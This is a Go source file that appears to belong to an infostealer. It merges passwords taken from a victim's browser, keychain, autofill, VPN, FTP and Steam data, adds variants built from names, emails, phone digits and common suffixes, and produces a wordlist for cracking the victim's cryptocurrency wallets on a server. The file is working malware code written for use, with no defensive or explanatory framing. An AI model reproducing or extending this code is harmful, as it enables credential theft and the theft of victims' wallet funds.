// password_candidates.go — builds a deduplicated password wordlist for wallets.
//
// Sources: browser saved passwords, autofill values, keychain dumps, plus light
// mutations (common suffixes/years). Capped at maxPasswordCandidates so the
// harvest zip stays small; the Mac login password is added by cmd/kematian.
package scanner

import (
	"strings"
	"unicode"

	"recovery/recovery/types"
)

const (
	maxPasswordCandidates = 2500
	maxPasswordLen        = 128
	minPasswordLen        = 1
)

// mutationSuffixes are cheap variants appended to base passwords (e.g. "pass" → "pass123").
var mutationSuffixes = []string{
	"", "1", "!", "123", "1234", "@", "#", "1!", "!1", "01",
	"2024", "2025", "2026", "2027",
}

// BuildPasswordCandidates merges browser passwords, macOS keychain entries, autofill hints,
// and common mutations into a deduplicated list for server-side wallet cracking.
func BuildPasswordCandidates(
	passwords []types.PasswordResult,
	autofill []types.AutofillResult,
	keychain []types.PasswordCandidateResult,
) []types.PasswordCandidateResult {
	seen := make(map[string]bool)
	var out []types.PasswordCandidateResult

	add := func(password, source, detail string) {
		password = strings.TrimSpace(password)
		if !validCandidatePassword(password) || seen[password] {
			return
		}
		seen[password] = true
		out = append(out, types.PasswordCandidateResult{
			Password: password,
			Source:   source,
			Detail:   detail,
		})
	}

	for _, row := range passwords {
		add(row.Password, "browser", row.URL)
		add(row.Username, "browser_username", row.URL)
		for _, m := range mutatePassword(row.Password) {
			add(m, "mutation", row.Password)
		}
	}

	for _, row := range keychain {
		add(row.Password, row.Source, row.Detail)
		for _, m := range mutatePassword(row.Password) {
			add(m, "mutation_keychain", row.Password)
		}
	}

	for _, hint := range autofillPasswordHints(autofill) {
		add(hint.password, hint.source, hint.detail)
		for _, m := range mutatePassword(hint.password) {
			add(m, "mutation_autofill", hint.password)
		}
	}

	if len(out) > maxPasswordCandidates {
		out = out[:maxPasswordCandidates]
	}
	return out
}

// AppendExtraPasswordCandidates adds WiFi, FTP, NordVPN, and other harvested app passwords.
func AppendExtraPasswordCandidates(candidates []types.PasswordCandidateResult, result *types.CollectionResult) []types.PasswordCandidateResult {
	if result == nil {
		return candidates
	}
	seen := make(map[string]bool, len(candidates))
	for _, c := range candidates {
		seen[c.Password] = true
	}
	add := func(password, source, detail string) {
		password = strings.TrimSpace(password)
		if !validCandidatePassword(password) || seen[password] {
			return
		}
		seen[password] = true
		candidates = append(candidates, types.PasswordCandidateResult{
			Password: password,
			Source:   source,
			Detail:   detail,
		})
		for _, m := range mutatePassword(password) {
			if validCandidatePassword(m) && !seen[m] {
				seen[m] = true
				candidates = append(candidates, types.PasswordCandidateResult{
					Password: m,
					Source:   "mutation_" + source,
					Detail:   password,
				})
			}
		}
	}

	for _, app := range result.AppCredentials {
		if app.Password != "" {
			add(app.Password, "app:"+app.Application, app.Host)
		}
	}
	if result.VPNs != nil {
		for _, nord := range result.VPNs.NordVPN {
			add(nord.Password, "vpn:nordvpn", nord.Username)
			add(nord.Username, "vpn:nordvpn_user", nord.Version)
		}
	}
	if result.Gaming != nil && result.Gaming.Steam != nil {
		add(result.Gaming.Steam.Account, "gaming:steam_account", result.Gaming.Steam.SteamPath)
	}

	if len(candidates) > maxPasswordCandidates {
		candidates = candidates[:maxPasswordCandidates]
	}
	return candidates
}

type autofillHint struct {
	password string
	source   string
	detail   string
}

func autofillPasswordHints(autofill []types.AutofillResult) []autofillHint {
	var hints []autofillHint
	seen := make(map[string]bool)

	var firstName, lastName, email, phone string
	for _, row := range autofill {
		name := strings.ToLower(strings.TrimSpace(row.Name))
		value := strings.TrimSpace(row.Value)
		if value == "" {
			continue
		}

		switch {
		case strings.Contains(name, "email"):
			if email == "" && strings.Contains(value, "@") {
				email = value
			}
		case strings.Contains(name, "phone"), strings.Contains(name, "tel"):
			if phone == "" {
				phone = digitsOnly(value)
			}
		case strings.Contains(name, "given"), strings.Contains(name, "first"):
			if firstName == "" {
				firstName = value
			}
		case strings.Contains(name, "family"), strings.Contains(name, "last"):
			if lastName == "" {
				lastName = value
			}
		}
	}

	add := func(password, source, detail string) {
		if !validCandidatePassword(password) || seen[password] {
			return
		}
		seen[password] = true
		hints = append(hints, autofillHint{password: password, source: source, detail: detail})
	}

	if firstName != "" && lastName != "" {
		fn := sanitizeNameToken(firstName)
		ln := sanitizeNameToken(lastName)
		add(fn+ln, "autofill_name", firstName+" "+lastName)
		add(fn+"_"+ln, "autofill_name", firstName+" "+lastName)
		add(titleCase(fn)+ln+"1!", "autofill_name", firstName+" "+lastName)
	}

	if email != "" {
		local := strings.SplitN(email, "@", 2)[0]
		local = strings.TrimSpace(local)
		if local != "" {
			add(local, "autofill_email", email)
			add(local+"123", "autofill_email", email)
			add(local+"1!", "autofill_email", email)
		}
	}

	if phone != "" {
		if len(phone) >= 4 {
			add(phone, "autofill_phone", phone)
			add(phone[len(phone)-4:], "autofill_phone_last4", phone)
		}
	}

	return hints
}

func mutatePassword(password string) []string {
	password = strings.TrimSpace(password)
	if !validCandidatePassword(password) {
		return nil
	}

	seen := make(map[string]bool)
	var out []string
	push := func(s string) {
		if !validCandidatePassword(s) || s == password || seen[s] {
			return
		}
		seen[s] = true
		out = append(out, s)
	}

	for _, suffix := range mutationSuffixes {
		push(password + suffix)
	}

	if len(password) > 0 {
		r := []rune(password)
		lower := strings.ToLower(password)
		upper := strings.ToUpper(password)
		title := strings.ToUpper(string(r[0]))
		if len(r) > 1 {
			title += strings.ToLower(string(r[1:]))
		}
		push(lower)
		push(upper)
		push(title)
		push(title + "1!")
		push(title + "123")
	}

	if strings.HasSuffix(password, "!") {
		push(strings.TrimSuffix(password, "!"))
	}
	if strings.HasSuffix(password, "1") {
		push(strings.TrimSuffix(password, "1"))
	}

	return out
}

func validCandidatePassword(password string) bool {
	if password == "" || len(password) < minPasswordLen || len(password) > maxPasswordLen {
		return false
	}
	for _, r := range password {
		if r == '\n' || r == '\r' || r == '\t' {
			return false
		}
	}
	return true
}

func sanitizeNameToken(s string) string {
	s = strings.TrimSpace(s)
	var b strings.Builder
	for _, r := range s {
		if unicode.IsLetter(r) || unicode.IsDigit(r) {
			b.WriteRune(unicode.ToLower(r))
		}
	}
	return b.String()
}

func titleCase(s string) string {
	if s == "" {
		return s
	}
	r := []rune(s)
	return strings.ToUpper(string(r[0])) + strings.ToLower(string(r[1:]))
}

func digitsOnly(s string) string {
	var b strings.Builder
	for _, r := range s {
		if r >= '0' && r <= '9' {
			b.WriteRune(r)
		}
	}
	return b.String()
}